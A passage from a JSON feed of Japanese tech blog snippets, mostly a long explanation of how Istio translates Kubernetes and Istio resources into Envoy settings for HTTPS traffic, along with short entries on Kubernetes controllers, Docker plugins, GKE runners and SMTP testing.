https://github.com/bells17/k8s-controller-example\\r\\rその他リンク:\\r\\rhttps://github.com/kubernetes/sample-controller\\rhttps://github.com/kubernetes/kubernetes/blob/v1.29.1/pkg/controller/clusterroleaggregation/clusterroleaggregation_controller.go\\rhttps://github.com/kubernetes/client-go/tree/v12.0.0\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/tools/cache/reflector.go\\rhttps://github.com/kubernetes/client-go/tree/v12.0.0/informers\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/tools/cache/store.go\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/tools/cache/delta_fifo.go\\rhttps://github.com/kubernetes/client-go/blob/v12.0.0/util/workqueue/rate_limiting_queue.go","isoDate":"2024-01-30T05:00:00.000Z","dateMiliSeconds":1706590800000,"authorName":"bells17","authorId":"bells17"},{"title":"Mac に Homebrew で docker pluings をインストールする","link":"https://blog.1q77.com/2024/01/install-docker-plugins-on-mac/","contentSnippet":"Homebrew で plugin をインストールDocker Desktop for Mac であれば何もしなくても docker compose コマンドは使えるようになっているのですが、Lima で docker を使っている場合などで Homebrew で docker をインストールしていると docker compose や docker buildx を使えるようにするためには追加でのインストールが必要でした。","isoDate":"2024-01-26T12:36:56.000Z","dateMiliSeconds":1706272616000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"限定公開のGKE上でセキュアなGithub Actionsのrunnerを構築","link":"https://zenn.dev/kojake_300/articles/7be501d3fc4e72","contentSnippet":"モチベーションGithub Actionsのセルフホストランナーでは、long pollingによりrunner側でingressのfirewallを設定せずにrunnerをデプロイ出来るというのを最近知ったので、GKEで検証していこうと思います。 構成ざっくりですがこんな感じ。GKEは限定公開のクラスタとして構築し、踏み台サーバからGKEにリクエストを送ります。Github Actionsとの通信のためにVPCにはCloud NATをアタッチします。 前提条件terraformで構築するため、予めインストールしておくこと。(検証はv1.0.0) 構築手順...","isoDate":"2024-01-24T11:08:37.000Z","dateMiliSeconds":1706094517000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"K8sGPT: Prometheus Analyzers","link":"https://zenn.dev/tozastation/articles/71015cc5b95b4e","contentSnippet":"v0.3.26 からPrometheus の Analyzer がリリースされましたデモ映像はこちらhttps://github.com/k8sgpt-ai/k8sgpt/pull/855本PR作成者の Daniel Clark さんは Google の方 (2024/01/18時点)で，prometheus-engine (Cloud Managed Service for Prometheus (GMP)) に多くのコントリビューションをされています． 先にまとめPrometheus Analyzer には現在二つの機能が含まれるConfig Analyzer ...","isoDate":"2024-01-23T03:00:00.000Z","dateMiliSeconds":1705978800000,"authorName":"tozastation","authorId":"tozastation"},{"title":"openssl s_client で SMTP 認証","link":"https://blog.1q77.com/2024/01/smtp-auth-plain-with-openssl-command/","contentSnippet":"Amazon SES での SMTP 認証情報の確認をしたいAmazon SES で SMTP を使ってメール送信したい場合、IAM User の credentials をちょいと加工してやる必要があります。Amazon SES SMTP 認証情報を取得","isoDate":"2024-01-23T02:44:23.000Z","dateMiliSeconds":1705977863000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"【Istio⛵️】Istioによって抽象化されるEnvoyのHTTPSリクエスト処理の仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2024/01/16/013404","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Istioのサイドカーメッシュを題材にしたEnvoyの設定の抽象化について様々なサービスメッシュツール (特に、Istio、Consul、Ciliumなど) でも流用できるEnvoyの知識についてこの記事から得られる知識01. はじめに02. 様々なリソースによるEnvoy設定の抽象化サービスメッシュ外からのHTTPSマイクロサービス間のHTTPSサービスメッシュ外へのHTTPS03. istio-proxyコンテナによるHTTPS処理Istioコントロールプレーンの仕組みサービスメッシュ外からのHTTPSマイクロサービス間のHTTPSサービスメッシュ外へのHTTPS04. EnvoyによるHTTPS処理Envoyの設定の種類フィルターフィルターの一覧フィルターチェーンの仕組み05. リソースの設定からEnvoy設定への翻訳各リソースとEnvoyの設定の関係一覧サービスメッシュ外からのHTTPSEnvoyの設定を抽象化するリソース一覧リソースとEnvoyの設定の対応関係istio-proxyコンテナ内のEnvoyに当てはめるマイクロサービス間のHTTPSEnvoyの設定を抽象化するリソース一覧リソースとEnvoyの設定の対応関係istio-proxyコンテナ内のEnvoyに当てはめるサービスメッシュ外へのHTTPSEnvoyの設定を抽象化するリソース一覧リソースとEnvoyの設定の対応関係istio-proxyコンテナ内のEnvoyに当てはめる06. 翻訳されたEnvoy設定値を見てみるEnvoyの現在の設定を出力するリスナーを出力するルートを出力するクラスターを出力するエンドポイントを出力する証明書を出力するサービスメッシュ外からのHTTPS送信元Pod側のistio-proxyコンテナ宛先Pod側のistio-proxyコンテナマイクロサービス間のHTTPS送信元Pod側のistio-proxyコンテナ宛先Pod側のistio-proxyコンテナサービスメッシュ外へのHTTPS送信元Pod側のistio-proxyコンテナ宛先Pod (Istio EgressGateway Pod) 側のistio-proxyコンテナ07. おわりに謝辞記事関連のおすすめ書籍01. はじめにどうも、俺 (REMIX) feat. Istioニキ a.k.a. いすてぃ男です。Istioは、Envoyを使用したサービスメッシュを実装します。IstioがKubernetesリソースやIstioカスタムリソースに基づいてEnvoyの設定を抽象化してくれるため、開発者はEnvoyをより簡単に設定できます。Envoyの設定の抽象化は、Envoyを使用したサービスメッシュ (例：Istioサイドカーメッシュ/アンビエントメッシュ、Consul、Istioから得られた学びを土台に登場したCiliumサイドカーフリーメッシュなど) に共通しています。つまり、次々に登場するEnvoyによるサービスメッシュツールに振り回されないようにするためには、ツールがどのようにEnvoyを抽象化するのかを理解しておく必要があります。そこで今回は、IstioサイドカーメッシュがEnvoyのHTTPSリクエストの処理をどのように抽象化するのかを解説します。また、抽象化されたEnvoyがHTTPSリクエストを処理する仕組みも一緒に解説します。これらの知識は、様々なサービスメッシュツールで流用できるはずです。それでは、もりもり布教していきます\uD83D\uDE1702. 様々なリソースによるEnvoy設定の抽象化まずは、どのようなリソースがHTTPSリクエストの処理に関係しているのかを、HTTPSリクエストの方向に分けて解説していきます。istio-proxyコンテナやEnvoyについては、次章以降で解説します。サービスメッシュ外からのHTTPSサービスメッシュ外から内にHTTPSリクエストを送信する場合、リソースが以下の順で紐付き、Envoyの設定を抽象化します。flowchart TD    送信元 -.->|HTTPS| Gateway    Gateway([⛵️ Gateway]) -.-> VirtualService    VirtualService([⛵️ VirtualService]) -.-> DestinationRule    DestinationRule([⛵️ DestinationRule]) -.-> Service    Service([☸️ Service]) -.-> Endpoints    Endpoints([☸️ Endpoints]) -.->|HTTPS| 宛先    classDef sly fill: #CCFFFF, stroke: black;    class 送信元 sly    classDef yellow fill: #FFFF88, stroke: black;    class 宛先 yellow    classDef blue fill: #326CE5, color: white, stroke: black;    class Gateway,VirtualService,DestinationRule,Service,Endpoints blue各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。クライアントは、サービスメッシュ外からL7ロードバランサーにHTTPSリクエストを送信します。L7ロードバランサーは、Istio IngressGateway PodにHTTPSリクエストを送信します。もちろん、クラスター外からIstio IngressGateway PodにHTTPリクエストを送信するために、Service (例：NodePort Service) が必要です。Istio IngressGateway Podは、宛先Podとの間で相互TLS認証を実施します。Istio IngressGateway Podは、Kubernetesリソース (Service、Endpoints) やIstioカスタムリソース (VirtualService、DestinationRule) に応じて、HTTPSリクエストを宛先PodにL7ロードバランシングします。Istio Ingress vs. Kubernetes Ingress – Daniel Watrous on Software and Cloud Engineeringマイクロサービス間のHTTPSサービスメッシュ内のPodから別のPodにHTTPSリクエストを送信する場合、リソースが以下の順で紐付き、Envoyの設定を抽象化します。flowchart TD    送信元 -.->|HTTPS| VirtualService    VirtualService([⛵️ VirtualService]) -.-> DestinationRule    DestinationRule([⛵️ DestinationRule]) -.-> Service    Service([☸️ Service]) -.-> Endpoints    Endpoints([☸️ Endpoints]) -.->|HTTPS| 宛先    classDef sly fill: #CCFFFF, stroke: black;    class 送信元 sly    classDef yellow fill: #FFFF88, stroke: black;    class 宛先 yellow    classDef blue fill: #326CE5, color: white, stroke: black;    class VirtualService,DestinationRule,Service,Endpoints blue各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。送信元Podは、宛先Podとの間で相互TLS認証を実施します。送信元Podは、Kubernetesリソース (Service、Endpoints) やIstioカスタムリソース (VirtualService、DestinationRule) の設定に応じて、HTTPSリクエストを宛先PodにL7ロードバランシングします。https://www.zhaohuabing.com/post/2018-09-25-istio-traffic-management-impl-intro/▶︎ サービスメッシュ内のPod間通信にkube-proxyは必要なのかistio-initコンテナは、istio-iptablesコマンドを実行し、iptablesのルールを書き換えます (本記事3章参照) 。これにより、送信元Podから宛先Podに直接通信できるようになります。Tracing network path in Istio. Istio is among the most widely used… | by Bikram Gupta | Mediumサービスメッシュ外へのHTTPSサービスメッシュ内のPodから外のシステム (例：データベース、ドメインレイヤー委譲先の外部API) にHTTPSリクエストを送信する場合、リソースが以下の順で紐付き、Envoyの設定を抽象化します。複数のVirtualServiceとDestinationが登場するため、これらには便宜上 X と Y をつけています。flowchart TD    送信元 -.->|HTTPS| VirtualServiceX    VirtualServiceX([⛵️ VirtualService X]) -.-> DestinationRuleX    DestinationRuleX([⛵️ DestinationRule X]) -.-> Service    Service([☸️ Service]) -.-> Endpoints    Endpoints([☸️ Endpoints]) -.-> Gateway    Gateway([⛵️ Gateway]) -.-> VirtualServiceY    VirtualServiceY([⛵️ VirtualService Y]) -.-> DestinationRuleY    DestinationRuleY([⛵️ DestinationRule Y]) -.-> ServiceEntry    ServiceEntry([⛵️ ServiceEntry]) -.->|HTTPS| 宛先    classDef sly fill: #CCFFFF, stroke: black;    class 送信元 sly    classDef yellow fill: #FFFF88, stroke: black;    class 宛先 yellow    classDef blue fill: #326CE5, color: white, stroke: black;    class Gateway,VirtualServiceX,VirtualServiceY,DestinationRuleX,DestinationRuleY,Service,Endpoints,ServiceEntry blue各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。送信元Podは、HTTPSリクエストの宛先がServiceEntryでエントリ済みか否かの設定に応じて、HTTPSリクエストの宛先を切り替えます。宛先がエントリ済みであれば、送信元PodはHTTPSリクエストの宛先にIstio EgressGateway Podを選択します。宛先が未エントリであれば、送信元PodはHTTPSリクエストの宛先に外のシステムを選択します。送信元Podは、Istio EgressGateway Podとの間で相互TLS認証を実施します。(1) で宛先がエントリ済であったとします。送信元Podは、HTTPSリクエストの向き先をIstio EgressGateway Podに変更します。送信元Podは、Kubernetesリソース (Service、Endpoints) やIstioカスタムリソース (VirtualService、DestinationRule) の設定に応じて、Istio EgressGateway PodにL7ロードバランシングします。Istio EgressGateway Podは、HTTPSリクエストをエントリ済システムにL7ロードバランシングします。Using Istio to MITM our users’ traffic | Steven ReitsmaIngress, egress, ServiceEntry DATA Flow issues for ISTIO API Gateway? - Discuss Istio▶︎ Istio EgressGatewayの必要性についてistio-proxyコンテナを経由せずに外部システムに直接HTTPSリクエストを送信できるようになってしまい、システムの安全性が低くなります。他に、サービスメッシュ外への特定の通信を識別できるようになるメリットもあります。Istio / Accessing External ServicesIstio / Egress Gateway Performance Investigation03. istio-proxyコンテナによるHTTPS処理前章では、KubernetesリソースやIstioカスタムリソースによって抽象化されたEnvoyまで言及しませんでした。本章では、解説をもう少し具体化します。Istioは、Envoyプロセスを持つistio-proxyコンテナを作成します。このistio-proxyコンテナを使用してどのようにHTTPSリクエストを処理しているのかを、HTTPSリクエストの方向に分けて解説します。Envoyの設定については、次章以降で解説します。Istioコントロールプレーンの仕組みEnvoyの設定を抽象化する責務を担うのは、Istioコントロールプレーン (discoveryコンテナ) です。Istioコントロールプレーンは異なる責務を担う複数のレイヤーから構成されています。レイヤー名      責務    Config ingestionレイヤー            kube-apiserverからKubernetesリソースやIstioカスタムリソースの設定を取得します。Istioの初期から名前は変わっていません。          Config translationレイヤー                   リソースの設定をEnvoy設定に変換します。Istioの初期ではConfig Data Modelレイヤーという名前で、執筆時点 (2024/01/16) で名前が変わっています。          Config servingレイヤー            Envoyの設定や証明書をPod内のistio-proxyコンテナに配布します。Istioの初期では、Proxy Servingレイヤーという名前で、執筆時点 (2024/01/16) で名前が変わっています。          図中の番号に沿って、Istioコントロールプレーンの仕組みを解説します。Config ingestionレイヤーにて、 Istioコントロールプレーンはkube-apiserverにHTTPSリクエストを送信します。ここで、KubernetesリソースやIstioカスタムリソースの設定を取得します。Config translationレイヤーにて、取得したリソースの設定をEnvoyの設定に変換します。Config servingレイヤーにて、Envoyの設定や証明書をPod内のistio-proxyコンテナに配布します。双方向ストリーミングRPCのため、istio-proxyコンテナがConfig servingレイヤーにリクエストを送信し、これらを取得することもあります。istio/architecture/networking/pilot.md at 1.20.2 \xb7 istio/istio \xb7 GitHubhttps://www.zhaohuabing.com/post/2020-05-25-istio-certificate/▶︎ Config servingレイヤーにあるXDS-APIについて▶︎ Istioカスタムリソースのコントローラーについてistio/architecture/networking/pilot.md at 1.20.2 \xb7 istio/istio \xb7 GitHubサービスメッシュ外からのHTTPSサービスメッシュ外から内にHTTPSリクエストを送信する場合のistio-proxyコンテナです。各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。Istioコントロールプレーンは、翻訳されたEnvoyの設定をPod内のistio-proxyコンテナに提供します。クライアントは、サービスメッシュ外からL7ロードバランサーにHTTPSリクエストを送信します。L7ロードバランサーは、Istio IngressGateway PodにHTTPSリクエストを送信します。もちろん、クラスター外からIstio IngressGateway PodにHTTPリクエストを送信するために、Service (例：NodePort Service) が必要です。Istio IngressGateway Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナに送信します (リダイレクトは不要)。Istio IngressGateway Pod内のistio-proxyコンテナは、宛先Podを決定し、またこのPodに対して相互TLS認証を実施します。Istio IngressGateway Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。宛先Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先マイクロサービスに送信します。Istio Ingress vs. Kubernetes Ingress – Daniel Watrous on Software and Cloud Engineering▶︎ Pod内のiptablesについてistio-proxyコンテナを経由するように、istio-proxyコンテナにリクエストをリダイレクトします。iptablesのルールを書き換えるのはistio-initコンテナです。Istioは、istio-proxyコンテナと同じタイミングで、istio-initコンテナをPodにインジェクションします (Istio IngressGatewayとIstio EgressGatewayのPodは除きます)。画像引用元：SoByteistio-initコンテナは、istio-iptablesコマンドを実行し、iptablesのルールを書き換えます。また、istio-initコンテナはルールを書き換えた後に終了するため、Podの起動後にPod内に残りません\uD83D\uDC4D\uD83C\uDFFB$ pilot-agent istio-iptables \\\\    -p 15001 \\\\    -z 15006 \\\\    -u 1337 \\\\    -m REDIRECT \\\\    -i * \\\\    -x \\\\    -b * \\\\    -d 15090,15020Sidecar injection, transparent traffic hijacking, and routing process in Istio explained in detail | by Jimmy Song | MediumIstio / pilot-agent▶︎ Istio IngressGateway Pod内のiptablesについてistio-proxyコンテナにリクエストをリダイレクトする必要がありません。そのため、Istioはiptablesのルールを書き換えるistio-initコンテナをIstio IngressGateway Podにインジェクションしません。つまり、Istio IngressGateway Pod内のiptablesのルールはデフォルトのままになっています\uD83D\uDC4D\uD83C\uDFFBマイクロサービス間のHTTPSサービスメッシュ内のPodから別のPodにHTTPSリクエストを送信する場合のistio-proxyコンテナです。各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。Istioコントロールプレーンは、翻訳されたEnvoyの設定をPod内のistio-proxyコンテナに提供します。送信元Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。送信元Pod内のistio-proxyコンテナは、宛先Podを決定し、またこのPodに対して相互TLS認証を実施します。送信元Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。宛先Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先マイクロサービスに送信します。https://www.zhaohuabing.com/post/2018-09-25-istio-traffic-management-impl-intro/サービスメッシュ外へのHTTPSサービスメッシュ内のPodから外のシステム (例：データベース、ドメインレイヤー委譲先の外部API) にHTTPSリクエストを送信する場合のistio-proxyコンテナです。各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。Istioコントロールプレーンは、翻訳されたEnvoyの設定をPod内のistio-proxyコンテナに提供します。送信元Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。送信元Pod内のistio-proxyコンテナは、宛先Podを決定し、またこのPodに対して相互TLS認証を実施します。この時、ServiceEntryで宛先がエントリ済みか否かに応じて、HTTPSリクエストの宛先を切り替えます。宛先がエントリ済みであれば、istio-proxyコンテナはHTTPSリクエストの宛先にIstio EgressGateway Podを選択します。宛先が未エントリであれば、istio-proxyコンテナはHTTPSリクエストの宛先に外のシステムを選択します。ここでは、宛先がエントリ済であったとします。送信元Pod内のistio-proxyコンテナは、HTTPSリクエストをIstio EgressGateway PodにL7ロードバランシングします。Istio EgressGateway Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナに送信します (リダイレクトは不要)。Istio EgressGateway Pod内のistio-proxyコンテナは、HTTPSリクエストをエントリ済システムにL7ロードバランシングします。▶︎ Istio EgressGateway Pod内のiptablesについてistio-proxyコンテナにリクエストをリダイレクトする必要がありません。そのため、Istioはiptablesのルールを書き換えるistio-initコンテナをIstio EgressGateway Podにインジェクションしません。つまり、Istio EgressGateway Pod内のiptablesのルールはデフォルトのままになっています\uD83D\uDC4D\uD83C\uDFFBUsing Istio to MITM our users’ traffic | Steven ReitsmaIngress, egress, ServiceEntry DATA Flow issues for ISTIO API Gateway? - Discuss Istio04. EnvoyによるHTTPS処理前章では、istio-proxyコンテナ内のEnvoyの設定まで、言及しませんでした。本章では、もっと具体化します。EnvoyがHTTPSリクエストを処理する仕組みを解説します。Envoyの設定の種類HTTPSリクエストを処理する場合、Envoyの設定が以下の順で紐付き、HTTPSリクエストを送信元から宛先まで届けます。flowchart TD    送信元 -.->|HTTPS| リスナー    リスナー(リスナー) -.-> リスナーフィルター    subgraph  \\"\\"      リスナーフィルター(リスナーフィルター) -.-> ネットワークフィルター      ネットワークフィルター(ネットワークフィルター) -.-> HTTPフィルター    end    HTTPフィルター(HTTPフィルター) -.-> ルート    ルート(ルート) -.-> クラスター    クラスター(クラスター) -.-> エンドポイント    エンドポイント(エンドポイント) -.->|HTTPS| 宛先classDef sly fill: #CCFFFF, stroke: black;class 送信元 slyclassDef yellow fill: #FFFF88, stroke: black;class 宛先 yellowclassDef red fill: #EA6B66, font-weight :bold, stroke: black;class リスナー,リスナーフィルター,ネットワークフィルター,HTTPフィルター,ルート,クラスター,エンドポイント red各処理がどのような責務を担っているのかをもう少し詳しく見てみましょう。図中の番号に沿って、EnvoyがHTTPSリクエストを処理する仕組みを解説します。送信元からのHTTPSリクエストの宛先ポートで、リスナーを絞り込みます。通信の種類 (例：HTTP、HTTPS、TCP、UDP、Unixドメインソケットなど) に応じてフィルターを選び、各フィルターがパケットのヘッダーを処理します。もしHTTPSであれば、送信元との間でTLS接続を確立し、パケットのL7のアプリケーションデータを復号化します。フィルターを使用して、HTTPSリクエストの宛先ポートで、ルートを絞り込みます。フィルターを使用して、HTTPSリクエストの宛先ホストやパスで、クラスターを絞り込みます。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、クラスター配下のエンドポイントを選びます。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、エンドポイントにL7ロードバランシングします。Life of a Request — envoy 1.37.0-dev-69fe40 documentation▶ TCPリクエストを処理する場合についてflowchart TD    送信元 -.->|TCP| リスナー    リスナー(リスナー) -.-> リスナーフィルター    subgraph  \\"\\"      リスナーフィルター(リスナーフィルター) -.-> ネットワークフィルター    end    ネットワークフィルター(ネットワークフィルター) -.-> クラスター    クラスター(クラスター) -.-> エンドポイント    エンドポイント(エンドポイント) -.->|TCP| 宛先classDef sly fill: #CCFFFF, stroke: black;class 送信元 slyclassDef yellow fill: #FFFF88, stroke: black;class 宛先 yellowclassDef red fill: #EA6B66, font-weight :bold, stroke: black;class リスナー,リスナーフィルター,ネットワークフィルター,クラスター,エンドポイント redDebugging Your Debugging Tools: What to do When Your Service Mesh Goes Down | PPTXフィルターフィルターの一覧Envoyのフィルターは、Envoyの機能を拡張するための設定です。HTTPSリクエストを処理するためには、リスナーフィルター、ネットワークフィルター、HTTPフィルター、といったフィルターが必要になります。全ては解説しきれないため、HTTPSリクエストを処理するための代表的なフィルターをいくつか抜粋しました。ただ、 Istioはこれらのフィルターをデフォルトで有効にしてくれている ため、開発者がEnvoyのフィルターを設定する場面は少ないです。逆をいえば、Istioを介さずにEnvoyをそのまま使用する場合、開発者がEnvoyのフィルターを自前で設定する必要があります\uD83D\uDC4D\uD83C\uDFFBフィルターの種類      HTTPSリクエストの処理に必要なフィルター(一部抜粋)      説明    リスナーフィルター      Original Destination      istio-proxyコンテナへのリダイレクト前の宛先情報をEnvoyが取得できるようにします。Pod内のiptablesがHTTPSリクエストをistio-proxyコンテナにリダイレクトすると、HTTPSリクエストの宛先がistio-proxyコンテナに変わってしまいます。ただし、iptablesはリダイレクト前の宛先をカーネル上のSO_ORIGINAL_DSTという定数に格納してくれています。Envoyは、カーネル上のSO_ORIGINAL_DSTから本来の宛先を取得し、プロキシします。    HTTP Inspector      EnvoyがHTTPを検知できるようにします。    TLS Inspector      EnvoyがTLSを検知できるようにします。TLSを検知した場合、EnvoyはTLSに関する処理を実行します。例えば、DownstreamTlsContextは、リスナーフィルター直後に、送信元との間でTLS接続を確立し、パケットのL7のアプリケーションデータを復号化します。また、UpstreamTlsContextは、クラスターの処理時に、宛先との間でTLS接続を確立し、L7のアプリケーションデータを暗号化します。    ネットワークフィルター      HTTP connection manager      Envoyが、L7のアプリケーションデータを読み取り、また後続のHTTPフィルターを制御できるようにします。    HTTPフィルター      Router      Envoyがポート番号でルート、ホストやパスでクラスターを絞り込めるようにします。    gRPC-Web      EnvoyがHTTP/1.1で受信したHTTPSリクエストをHTTP/2に変換し、gRPCサーバーにプロキシできるようにします。    Filters — envoy 1.37.0-dev-69fe40 documentation▶︎ Istioがデフォルトで有効にするEnvoyの設定についてistio-proxyコンテナは、イメージのビルド時に、あらかじめ用意しておいたEnvoyの設定ファイルを組み込みます。そのため、istio-proxyコンテナ内のEnvoyは、多くの設定をデフォルトで有効にできます。Istioを利用する開発者が、EnvoyがHTTPSリクエストを処理するために必要なフィルターを有効にしなくてよいのも、Istioのおかげです。Istioほんまにありがとな\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F  istio/pilot/docker/Dockerfile.proxyv2 at 1.20.2 \xb7 istio/istio \xb7 GitHubistio/tools/packaging/common/envoy_bootstrap.json at 1.20.2 \xb7 istio/istio \xb7 GitHubフィルターチェーンの仕組みEnvoyは、複数のフィルターからなるフィルターチェーンを実行し、HTTPSを処理します。図中の番号に沿って、Envoyのフィルターチェーンの仕組みを解説します。各フィルターの機能は、前述したフィルターの一覧を参考にしてください\uD83D\uDE47\uD83C\uDFFBリスナーフィルター (Original Destination、HTTP Inspector、TLS Inspectorなど) を実行します。(1) でTLS InspectorがTLSを検知した場合、DownstreamTlsContextで宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。ネットワークフィルター (HTTP connection managerなど) を実行します。HTTPフィルター (Router、gRPC-Webなど) を実行します。Life of a Request — envoy 1.37.0-dev-69fe40 documentation▶ TCPリクエストを処理する場合についてTCP proxy — envoy 1.37.0-dev-69fe40 documentation05. リソースの設定からEnvoy設定への翻訳いよいよです\uD83D\uDD25Istioが各リソースをいずれのEnvoyの設定に翻訳しているのかを解説します。表で対応関係の一覧を示した後、istio-proxyコンテナ内のEnvoyに当てはめました。各リソースとEnvoyの設定の関係一覧Istioコントロールプレーンは、KubernetesリソースやIstioカスタムリソースの設定をEnvoyの設定に翻訳し、処理の流れに当てはめます。以下の通り、各リソースがいずれのEnvoyの設定を抽象化するのかを整理しました。リソースによっては、Envoyの複数の設定を抽象化します。なお、Istioの用意したEnvoyのフィルターのデフォルト値を変更するユースケースが少ないため、これを抽象化するEnvoyFilterについては言及しません。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            ✅      ✅                  ✅    ルート      ✅                  ✅                      クラスター      ✅                        ✅      ✅      ✅    エンドポイント            ✅                  ✅      ✅          Debugging Your Debugging Tools: What to do When Your Service Mesh Goes Down | PPTX- YouTubeサービスメッシュ外からのHTTPSEnvoyの設定を抽象化するリソース一覧サービスメッシュ外からのHTTPSリクエストを処理する場合に関係するリソースを抜粋しました。Gatewayは、Istio IngressGatewayの一部として使用します。ServiceEntryは、使用しないリソースのため、\xd7としています。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            ✅      ✅            \xd7      ✅    ルート      ✅                  ✅            \xd7          クラスター      ✅                        ✅      \xd7      ✅    エンドポイント            ✅                  ✅      \xd7          リソースとEnvoyの設定の対応関係送信元または宛先Envoyに分けると、各リソースは以下のようにEnvoyの設定を抽象化します。話を簡単にするために、送信元と宛先は同じNamespaceにあると仮定します。送信元EnvoyでHTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、同じリソースが抽象化します。      Kubernetes ☸️リソース       Istio ⛵️カスタムリソース     Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      PeerAuthentication    送信元      リスナー      ✅            ✅      ✅            ✅    ルート      ✅                  ✅                クラスター      ✅                        ✅      ✅    エンドポイント            ✅                  ✅          宛先      リスナー      ✅                  ✅            ✅    ルート      ✅                  ✅                クラスター      ✅                        ✅      ✅    エンドポイント            ✅                  ✅          ▶︎ 送信元と宛先のNamespaceについてistio-ingress) においた方が良いです。マイクロサービスとは異なるNamespaceにIstio IngressGatewayを置くことで、Istio IngressGatewayをアップグレードしやすくなったり、他から障害の影響を受けにくくなります\uD83D\uDE46\uD83C\uDFFB‍♂️istio-proxyコンテナ内のEnvoyに当てはめるこの表を、HTTPSリクエストの仕組みの中に当てはめると、以下になります。引用した前述の解説のイメージが掴めるかと思います。送信元または宛先Envoyでほとんど同じリソースが登場しますが、 Gatewayは送信元Envoyだけで登場します。リソースの種類だけに着目すると、以下になります。Gatewayが送信元Envoyだけで登場することがわかりやすくなりました。マイクロサービス間のHTTPSEnvoyの設定を抽象化するリソース一覧サービスメッシュ内のPodから別のPodへのHTTPSリクエストを処理する場合に関係するリソースを抜粋しました。GatewayとServiceEntryは、使用しないリソースのため、\xd7としています。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            \xd7      ✅            \xd7      ✅    ルート      ✅            \xd7      ✅            \xd7          クラスター      ✅            \xd7            ✅      \xd7      ✅    エンドポイント            ✅      \xd7            ✅      \xd7          リソースとEnvoyの設定の対応関係送信元または宛先Envoyに分けると、各リソースは以下のようにEnvoyの設定を抽象化します。話を簡単にするために、送信元と宛先は同じNamespaceにあると仮定します。送信元EnvoyでHTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、同じリソースが抽象化します。      Kubernetes ☸️リソース       Istio ⛵️カスタムリソース     Envoyの設定      Service      Endpoints      VirtualService      DestinationRule      PeerAuthentication    送信元      リスナー      ✅            ✅            ✅    ルート      ✅            ✅                クラスター      ✅                  ✅      ✅    エンドポイント            ✅            ✅          宛先      リスナー      ✅            ✅            ✅    ルート      ✅            ✅                クラスター      ✅                  ✅      ✅    エンドポイント            ✅            ✅          istio-proxyコンテナ内のEnvoyに当てはめるこの表を、HTTPSリクエストの仕組みの中に当てはめると、以下になります。引用した前述の解説のイメージが掴めるかと思います。送信元または宛先Envoyで、同じリソースが登場します。リソースの種類だけに着目すると、以下になります。送信元または宛先Envoyで同じリソースが登場することがわかりやすくなりました。サービスメッシュ外へのHTTPSEnvoyの設定を抽象化するリソース一覧サービスメッシュ内のPodから外のシステム (例：データベース、ドメインレイヤー委譲先の外部API) へのHTTPSリクエストを処理する場合に関係するリソースを抜粋しました。Gatewayは、Istio EgressGatewayの一部として使用します。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            ✅      ✅                  ✅    ルート      ✅                  ✅                      クラスター      ✅                        ✅      ✅      ✅    エンドポイント            ✅                  ✅      ✅          リソースとEnvoyの設定の対応関係送信元または宛先Envoyに分けると、各リソースは以下のようにEnvoyの設定を抽象化します。話を簡単にするために、送信元と宛先は同じNamespaceにあると仮定します。他の場合とは異なり、送信元EnvoyでHTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、異なるリソースが抽象化します。PeerAuthenticationだけは、話を簡単にするために送信元と宛先が同じNamespaceであると仮定しているので、同じリソースが抽象化します。送信元Envoyの設定の抽象化で登場するリソースが宛先では登場せず、逆も然りです。      Kubernetes ☸️リソース       Istio ⛵️カスタムリソース     Envoyの設定      Service      Endpoints      Gateway      VirtualServiceX      〃Y      DestinationRuleX      〃Y      